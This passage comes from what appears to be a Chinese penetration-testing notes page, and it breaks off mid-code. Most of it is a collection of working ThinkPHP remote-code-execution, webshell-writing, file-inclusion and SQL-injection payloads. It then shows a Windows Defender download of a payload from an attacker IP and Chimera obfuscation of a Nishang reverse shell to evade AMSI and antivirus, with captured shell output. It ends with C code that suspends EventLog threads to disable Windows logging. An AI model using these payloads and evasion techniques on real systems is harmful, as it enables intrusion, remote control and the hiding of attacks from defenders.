alt="image"></p><pre><code>黑盒测试也比较类似，一般情况下找到数据库交互点后进行注入尝试即可。cache写shellcache写webshell的难点在于cache文件名的确定，一般情况下是md5(绝对路径)生成的cache文件，上文也提到某些情况下可以通过log文件确定cache文件名称cache文件写入的时候会被注释，所以需要通过%0d%0a提行绕过注释。所以最终的payload一般为：%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//找到参数影响页面的点后通过传参写入webshell，本地可以复现，实战中倒是没遇到过。tp3渗透主要思路tp3的渗透在实战中利用的点比较少，所以一般而言遇到tp3的目标，最主要的思路在于找log，然后通过log去看有没有后台之类的，相对来说较一起会比对框架的注入，cache写shell等靠谱。tp3 关于log文件相关的利用同tp5，目录一般为./Application/Runtime/logs/xxx/xx_xx_xx.log ，其中xxx为app名，文件名为年_月_日.log，如：Application\Runtime\Logs\Home\16_09_09.log，文件名的格式可能会有变化，多尝试一下一般也能找到。tp6的新型问题tp6的利用链关于model.php的__destruct()方法调用其他类__tostring()方法的文已经有人发过了，但是文中把poc打码了，这里简单跟一下。</code></pre><p><img src="./img/804.png" alt="image"></p><pre><code>将对象的lazySave属性设置为True进入save方法：</code></pre><p><img src="./img/805.png" alt="image"></p><pre><code>然后进updateData方法：</code></pre><p><img src="./img/806.png" alt="image"></p><pre><code>在checkAllowFields方法中调用db方法，图中方法中框起来的语句是可以拼接的，只需要将这两个属性中的一个设置为类对象，即可触发对象的__toString方法。之后的利用方式和tp5.*相同。</code></pre><p><img src="./img/807.png" alt="image"><br><img src="./img/808.png" alt="image"></p><pre><code>接着与tp5.*后的gadget是一致的，最终目的是要这个效果实现代码执行。</code></pre><p><img src="./img/809.png" alt="image"></p><pre><code>接下来是构造poc，由于测试利用链，笔者手写了一个unserialize。</code></pre><p><img src="./img/810.png" alt="image"></p><pre><code>然后通过Dido1960大佬的poc代码生成payload。poc参见：https://github.com/Dido1960/thinkphp/blob/master/v6.0.x/poc/poc.php</code></pre><p><img src="./img/811.png" alt="image"></p><pre><code>该利用链需求一个反序列化的可控点，二次开发在使用unserialize后可能导致代码执行。同时也可能利用该问题构成一个tp6的后门，如已经通过其他方式获取服务器权限，则可在某些地方加入unserialize函数实现反序列化的一个后门。所有pocThinkphp5 rce poc利用工具https://github.com/wh1t3p1g/phpggchttps://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collectionthinkphp 5.0.221、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1thinkphp 55、http://127.0.0.1/tp5/public/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1thinkphp 5.0.216、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1thinkphp 5.1.*8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=19、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=113、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=115、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd未知版本16、?s=index/\think\module/action/param1/$&#123;@phpinfo()&#125;17、?s=index/\think\Module/Action/Param/$&#123;@phpinfo()&#125;18、?s=index/\think/module/aciton/param1/$&#123;@print(THINK_VERSION)&#125;19、index.php?s=/home/article/view_recent/name/1&#39;header = &quot;X-Forwarded-For:1&#39;) and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;20、index.php?s=/home/shopcart/getPricetotal/tag/1%2721、index.php?s=/home/shopcart/getpriceNum/id/1%2722、index.php?s=/home/user/cut/id/1%2723、index.php?s=/home/service/index/id/1%2724、index.php?s=/home/pay/chongzhi/orderid/1%2725、index.php?s=/home/pay/index/orderid/1%2726、index.php?s=/home/order/complete/id/1%2727、index.php?s=/home/order/complete/id/1%2728、index.php?s=/home/order/detail/id/1%2729、index.php?s=/home/order/cancel/id/1%2730、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1Content-Disposition: form-data; name=&quot;couponid&quot;1&#39;) union select sleep(&#39;&#39;&#39;+str(sleep_time)+&#39;&#39;&#39;)#thinkphp 5.0.23（完整版）debug模式32、(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxxthinkphp 5.0.23(完整版)33、（post）public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -althinkphp 5.0.10（完整版）34、(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=systemthinkphp 5.1.* 和 5.2.* 和 5.0.*35、(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filterThinkphp5 注入 poc需开启app_debughttp://yoursite/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1http://localhost:8000/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0http://localhost:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#http://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23Thinkphp5 文件包含 poc5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10创建 application/index/view/index/index.html 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 1.jpg 放至 public 目录下（模拟上传图片操作）。接着访问     http://localhost:8000/index/index/index?cacheFile=demo.php 链接，即可触发 文件包含漏洞 。Thinkphp5 代码执行poc5.0.0&lt;=ThinkPHP5&lt;=5.0.10http://localhost/tpdemo/public/?username=mochazz123%0d%0a@eval($_GET[_]);//http://localhost:8000/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=systemThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -alThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls写shell进日志_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;写shell进sessionPOST /?s=captcha HTTP/1.1Cookie: PHPSESSID=kking_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]=1&amp;包含session getshellPOST /?s=captcha_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=tmp\sess_kking&amp;server[]=1通过日志包含getshell_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();&amp;POST /?s=captchaCookie: PHPSESSID=kking_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8%2bab&amp;server[]=1+号用urlencode编码为%2b，前后加ab为了凑足解码/?s=captcha&amp;r=phpinfo();_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=php://filter/read=convert.base64-decode/resource=c:\www\tmp\sess_kking&amp;server[]=1&amp;POST /?s=captcha&amp;r=phpinfo();Cookie: PHPSESSID=kking_method=__construct&amp;method=get&amp;filter[]=base64_decode&amp;filter[]=think\__include_file&amp;get[]=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWM6XHd3d1x0bXBcc2Vzc19ra2luZw==&amp;server[]=1&amp;设置sessionPOST /?s=captchaCookie: PHPSESSID=kktest_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1文件包含POST /?s=captcha&amp;r=cGhwaW5mbygpOw==_method=__construct&amp;filter[]=strrev&amp;filter[]=think\__include_file&amp;method=get&amp;server[]=1&amp;get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:phpThinkphp6 任意文件创建需可控session参数，如username/index.php?username=&lt;?php phpinfo();?&gt;Cookie:1234567890123456789012345670.phpCookie需32位在runtime\session下生成sess_1234567890123456789012345670.php文件</code></pre><h2 id="使用windows-defender下载文件"><a href="#使用windows-defender下载文件" class="headerlink" title="使用windows defender下载文件"></a>使用windows defender下载文件</h2><pre><code>C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0&gt;MpCmdRun.exe -DownloadFile -url http://192.168.2.105:8000/payload.c -path c:\\users\\test\\desktop\\1.c</code></pre><p><img src="./img/812.png" alt="image"></p><pre><code>其他利用</code></pre><p><img src="./img/812-2.png" alt="image"><br><img src="./img/812-3.jfif" alt="image"><br><img src="./img/812-4.jfif" alt="image"></p><h2 id="Powershell脚本混淆绕过amsi和av"><a href="#Powershell脚本混淆绕过amsi和av" class="headerlink" title="Powershell脚本混淆绕过amsi和av"></a>Powershell脚本混淆绕过amsi和av</h2><pre><code>https://github.com/tokyoneon/Chimera以下是Invoke-PowerShellTcp.ps1的片段</code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$stream &#x3D; $client.GetStream()[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;#Send back current username and computername$sendbytes &#x3D; ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;&#96;nCopyright (C) 2015 Microsoft Corporation. All rights reserved.&#96;n&#96;n&quot;)$stream.Write($sendbytes,0,$sendbytes.Length)#Show an interactive PowerShell prompt$sendbytes &#x3D; ([text.encoding]::ASCII).GetBytes(&#39;PS &#39; + (Get-Location).Path + &#39;&gt;&#39;)$stream.Write($sendbytes,0,$sendbytes.Length)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/813.png" alt="image"></p><pre><code>经过Chimera处理后</code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.              $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov &#x3D; $jYODNAbvrcYMGaAnZHZwE.&quot;$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS&quot;()       # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.          [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN &#x3D; 0..65535|%&#123;0&#125;   # Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, in ship-to-ship combat.  # Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.           # Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.   # Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.           $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK &#x3D; ([teXt.enCoDInG]::AsCII).&quot;$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm&quot;(&quot;WInDows Powershell rUnnInG As User &quot; + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + &quot; on &quot; + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + &quot;&#96;nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.&#96;n&#96;n&quot;)# Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.            $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)   # An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>VirusTotal报告检测到0个</code></pre><p><img src="./img/814.png" alt="image"></p><pre><code>Kali下安装sudo apt-get update &amp;&amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils gitsudo git clone https://github.com/tokyoneon/chimera /opt/chimerasudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/sudo chmod +x chimera.sh; ./chimera.sh --help在shells /目录中有几个Nishang脚本和一些通用脚本。所有都已经过测试使用脚本之前，请将硬编码的IP地址（192.168.56.101）更改为您的Kali地址。/opt/chimera$ sed -i &#39;s/192.168.56.101/&lt;YOUR-IP-ADDRESS&gt;/g&#39; shells/*.ps1所有脚本的默认端口为4444。如果需要，再次使用sed进行更改。/opt/chimera$ sed -i &#39;s/4444/&lt;YOUR-DESIRED-PORT&gt;/g&#39; shells/*.ps1f：输入文件。-o：输出文件。-g：从脚本中省略几个Nishang特定的特征。-v：替换变量名称。-t：替换数据类型。-j：替代函数名称。-i：在每一行中插入任意注释。-c：用任意数据替换注释。-h：将IP地址转换为十六进制格式。-s：替换各种字符串。-b：在可能的情况下反引号字符串。-e：过程完成后，检查混淆文件。举例，nc反弹shellnc -v -l -p 4444把混淆好的脚本传入目标PS&gt; powershell.exe -ep bypass C:\path\to\chimera.ps1获得shellnc -v -l -p 4444listening on [any] 4444 ...192.168.56.105: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.107] from (UNKNOWN) [192.168.56.105] 49725Windows PowerShell running as user  onCopyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\Users\target&gt;一些使用说明https://github.com/tokyoneon/Chimera/blob/master/USAGE.md</code></pre><h2 id="通过挂起EventLog服务线程禁用Windows事件日志"><a href="#通过挂起EventLog服务线程禁用Windows事件日志" class="headerlink" title="通过挂起EventLog服务线程禁用Windows事件日志"></a>通过挂起EventLog服务线程禁用Windows事件日志</h2><pre><code>Windows事件日志由svchost.exe托管处理。EventLog如果我们列出svchost进程，则会看到许多这样的进程：</code></pre><p><img src="./img/815.png" alt="image"></p><pre><code>从上面的屏幕截图中，尚不清楚哪个进程真正托管了该服务，但是如果我们继续在Process Hacker中逐个检查进程，我们最终将找到托管该服务的进程，当前为pid 2196：EventLog svchost.exe</code></pre><p><img src="./img/816.png" alt="image"></p><pre><code>通过以下命令获得eventlog的进程IDGet-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId</code></pre><p><img src="./img/817.png" alt="image"></p><pre><code>如果我们查看的svchost.exe线程，则会看到</code></pre><p><img src="./img/818.png" alt="image"></p><pre><code>下面显示的是，确实，暂停足以使EventLog服务无法注册任何新事件：没有挂起时修改个密码</code></pre><p><img src="./img/819.png" alt="image"></p><pre><code>会注册新的事件挂起时则没有新的事件</code></pre><p><img src="./img/820.png" alt="image"></p><pre><code>代码实现下面是在较高级别下工作的技术代码：1.使用OpenSCManagerA命令打开服务控制管理器的句柄 2.使用OpenServiceA命令打开EventLog服务的句柄 3.使用QueryServiceStatusEx命令检索svchost.exe（托管EventLog）进程ID4.打开svchost.exe进程的句柄（从第3步开始）5.获取由svchost.exe加载的已加载模块的列表 EnumProcessModules6.循环浏览在步骤5中检索到的已加载模块列表，使用查找其名称并找到模块的基地址-这是包含服务内部工作的模块7.获取模块信息。它将返回带有模块的起始地址-我们稍后将在确定服务线程是否落入wevtsvc.dll模块的内存空间时需要这些详细信息wevtsvc.dll   GetModuleInformation EventLog8.枚举svchost.exe内的所有线程。Thread32FirstThread32Next9.对于步骤8中的每个线程，使用NtQueryInformationThread命令检索线程的起始地址 10.对于步骤8中的每个线程，检查线程的起始地址是否属于svchost.exe内部的内存空间。wevtsvc.dll11.如果线程的起始地址在内存空间内，则这是我们的目标线程，我们将其挂起wevtsvc.dll SuspendThread12.EventLog 服务现已禁用</code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Psapi.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;TlHelp32.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dbghelp.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">"DbgHelp"</span><span class="token expression"><span class="token punctuation">)</span></span></span>using myNtQueryInformationThread <span class="token operator">=</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>NTAPI<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>IN HANDLE ThreadHandle<span class="token punctuation">,</span>IN THREADINFOCLASS ThreadInformationClass<span class="token punctuation">,</span>OUT PVOID ThreadInformation<span class="token punctuation">,</span>IN ULONG ThreadInformationLength<span class="token punctuation">,</span>OUT PULONG ReturnLength<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>HANDLE serviceProcessHandle<span class="token punctuation">;</span>HANDLE snapshotHandle<span class="token punctuation">;</span>HANDLE threadHandle<span class="token punctuation">;</span>HMODULE modules<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>SIZE_T modulesSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>modules<span class="token punctuation">)</span><span class="token punctuation">;</span>DWORD modulesSizeNeeded <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>DWORD moduleNameSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>SIZE_T modulesCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>WCHAR remoteModuleName<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>HMODULE serviceModule <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>MODULEINFO serviceModuleInfo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>DWORD_PTR threadStartAddress <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>DWORD bytesNeeded <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>myNtQueryInformationThread NtQueryInformationThread <span class="token operator">=</span> <span class="token punctuation">(</span>myNtQueryInformationThread<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationThread"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>THREADENTRY32 threadEntry<span class="token punctuation">;</span>threadEntry<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>THREADENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>SC_HANDLE sc <span class="token operator">=</span> <span class="token function">OpenSCManagerA</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> MAXIMUM_ALLOWED<span class="token punctuation">)</span><span class="token punctuation">;</span>SC_HANDLE service <span class="token operator">=</span> <span class="token function">OpenServiceA</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token string">"EventLog"</span><span class="token punctuation">,</span> MAXIMUM_ALLOWED<span class="token punctuation">)</span><span class="token punctuation">;</span>SERVICE_STATUS_PROCESS serviceStatusProcess <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get PID of svchost<span class="token punctuation">.</span>exe that hosts EventLog service</span></span><span class="token function">QueryServiceStatusEx</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> SC_STATUS_PROCESS_INFO<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>serviceStatusProcess<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serviceStatusProcess<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesNeeded<span class="token punctuation">)</span><span class="token punctuation">;</span>DWORD servicePID <span class="token operator">=</span> serviceStatusProcess<span class="token punctuation">.</span>dwProcessId<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Open handle to the svchost<span class="token punctuation">.</span>exe</span></span>serviceProcessHandle <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> servicePID<span class="token punctuation">)</span><span class="token punctuation">;</span>snapshotHandle <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPTHREAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get a list of modules loaded by svchost<span class="token punctuation">.</span>exe</span></span><span class="token function">EnumProcessModules</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> modules<span class="token punctuation">,</span> modulesSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>modulesSizeNeeded<span class="token punctuation">)</span><span class="token punctuation">;</span>modulesCount <span class="token operator">=</span> modulesSizeNeeded <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> modulesCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>serviceModule <span class="token operator">=</span> modules<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Get loaded module's name</span></span><span class="token function">GetModuleBaseName</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> serviceModule<span class="token punctuation">,</span> remoteModuleName<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>remoteModuleName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">wcscmp</span><span class="token punctuation">(</span>remoteModuleName<span class="token punctuation">,</span> L<span class="token string">"wevtsvc.dll"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Windows EventLog module %S at %p\n\n"</span><span class="token punctuation">,</span> remoteModuleName<span class="token punctuation">,</span> serviceModule<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">GetModuleInformation</span><span class="token punctuation">(</span>serviceProcessHandle<span class="token punctuation">,</span> serviceModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>serviceModuleInfo<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>MODULEINFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Enumerate threads</span></span><span class="token function">Thread32First</span><span class="token punctuation">(</span>snapshotHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Thread32Next</span><span class="token punctuation">(</span>snapshotHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadEntry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>threadEntry<span class="token punctuation">.</span>th32OwnerProcessID <span class="token operator">==</span> servicePID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>threadHandle <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> threadEntry<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">NtQueryInformationThread</span><span class="token punctuation">(</span>threadHandle<span class="token punctuation">,</span> <span class="token punctuation">(</span>THREADINFOCLASS<span class="token punctuation">)</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>threadStartAddress<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Check <span class="token keyword">if</span> thread's start address is inside wevtsvc<span class="token punctuation">.</span>dll memory range</span></span><span class="token keyword">if</span> <span class="token punctuation">(</span>threadStartAddress <span class="token operator">>=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>serviceModuleInfo<span class="token punctuation">.</span>lpBaseOfDll <span class="token operator">&amp;&amp;</span> threadStartAddress <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>serviceModuleInfo<span class="token punctuation">.</span>lpBaseOfDll <span class="token operator">+</span> serviceModuleInfo<span class="token punctuation">.</span>SizeOfImage<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Suspending EventLog thread %d with start address %p\n"</span><span class="token punctuation">,</span> threadEntry<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">,</span> threadStartAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Suspend EventLog service thread</span></span><span class="token function">SuspendThread</span><span class="token punctuation">(</span>threadHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token 